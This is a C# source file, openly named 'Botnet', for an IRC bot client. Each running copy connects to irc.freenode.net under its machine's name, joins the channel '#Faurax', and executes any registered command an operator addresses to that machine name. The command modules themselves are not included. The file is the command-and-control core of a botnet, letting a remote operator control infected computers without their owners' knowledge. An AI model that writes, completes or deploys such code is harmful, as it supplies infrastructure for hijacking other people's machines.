using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ChatSharp;
using BotnetModuleAPI;

namespace Botnet
{
    class Program
    {

        public static CommandManager cs;
        public IrcClient client;
        public static Program instance;

        public IrcClient getClient()
        {
            if (client == null)
            {
                client = new IrcClient("irc.freenode.net", new IrcUser(System.Environment.MachineName, "RudyBOT"));
            }
            return client;
        }

        public static Program getInstance()
        {
            if (instance == null)
            {
                instance = new Program();
            }
            return instance;
        }

        public static CommandManager getCommandManager()
        {
            if (cs == null)
            {
                cs = new CommandManager();
            }
            return cs;
        }

        static void Main(string[] args)
        {
            connectAndListen();
        }

        public static void loadUpModules()
        {

        }

        public static void connectAndListen()
        {
            getCommandManager().setup();
            getInstance().getClient().ConnectionComplete += (s, e) => getInstance().getClient().JoinChannel("#Faurax");
            getInstance().getClient().ChannelMessageRecieved += (s, e) =>
            {
                if (e.PrivateMessage.Message.StartsWith("@") && e.PrivateMessage.Message.Substring(1).Split(' ')[0].Equals(System.Environment.MachineName))
                {
                    Console.WriteLine("Received message \"" + e.PrivateMessage.Message + "\" from " + e.PrivateMessage.User.Nick);
                    String[] arguments = e.PrivateMessage.Message.Substring(3 + System.Environment.MachineName.Length).Split(' ');
                    var channel = Program.getInstance().getClient().Channels[e.PrivateMessage.Source];
                    foreach (var Command in getCommandManager().getCommands())
                    {
                        Console.WriteLine("Checking " + Command.GetCatalyst() + " against " + arguments[0] + " with a size of " + arguments.Length);
                        Console.WriteLine("Trying to execute command : " + Command.GetCatalyst());
                        if (String.Equals(Command.GetCatalyst(), arguments[0]))
                        {
                            Console.WriteLine("Successfull evaluation of command " + Command.ToString());
                            Command.Execute(e.PrivateMessage.User, arguments, channel);
                            break;
                        }
                        continue;
                    }
                }
            };

            getInstance().getClient().ConnectAsync();
            while (true) ;
        }
    }
}